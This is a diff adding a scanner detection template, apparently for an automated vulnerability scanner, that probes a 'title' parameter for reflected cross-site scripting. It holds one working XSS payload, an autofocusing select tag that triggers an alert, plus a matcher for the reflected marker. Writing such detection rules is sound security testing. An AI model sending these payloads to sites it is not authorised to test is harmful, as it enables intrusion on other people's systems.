@@ -1,0 +1,20 @@
+id: xss2-098
+name: 'Reflected XSS2 ctx-7 via title'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in title'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      title:
+        - '<select onfocus=alert(nx2097) autofocus>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx2097'
